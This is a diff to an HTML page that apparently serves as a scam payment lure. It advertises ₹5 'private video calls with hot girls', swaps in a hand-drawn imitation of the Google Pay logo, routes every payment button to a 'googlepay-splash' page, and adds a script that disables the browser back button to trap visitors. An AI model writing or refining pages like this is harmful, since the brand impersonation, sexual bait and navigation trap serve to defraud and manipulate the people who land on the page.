@@ -90,6 +90,11 @@
       font-size: 13px;
     }
     
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-10px); }
+    }
+    
     .features-list {
       text-align: left;
       margin: 14px 0;
@@ -215,8 +220,8 @@
     </div>
     
     <div class="offer-msg">
-      <strong>🔥 Unlock Premium!</strong>
-      Pay ₹5 for private 1-on-1 video calls with hot girls!
+      <strong>🔥 Unlock Premium! 💋</strong>
+      Pay ₹5 for private 1-on-1 video calls with hot girls! 😘
     </div>
     
     <div class="features-list">
@@ -244,10 +249,11 @@
       <div class="pay-options">
         <div class="pay-option" onclick="goToSplash()">
           <!-- Google Pay Logo -->
-          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-            <path d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4z" fill="#4285F4"/>
-            <path d="M22 32V16h4v16h-4z" fill="#fff"/>
-            <path d="M28 24c0-2.21 1.79-4 4-4s4 1.79 4 4-1.79 4-4 4-4-1.79-4-4z" fill="#34A853"/>
+          <svg viewBox="0 0 512 200" xmlns="http://www.w3.org/2000/svg">
+            <text x="10" y="120" font-family="Google Sans, Arial" font-size="100" font-weight="bold" fill="#5F6368">G</text>
+            <circle cx="250" cy="100" r="80" fill="#4285F4"/>
+            <circle cx="250" cy="100" r="50" fill="#fff"/>
+            <text x="300" y="120" font-family="Google Sans, Arial" font-size="80" font-weight="bold" fill="#34A853">Pay</text>
           </svg>
         </div>
         <div class="pay-option" onclick="goToSplash()">
@@ -282,6 +288,12 @@
   </div>
 
   <script>
+    // Disable back button
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+    
     function goToSplash() {
       window.location.href = 'googlepay-splash.html';
     }
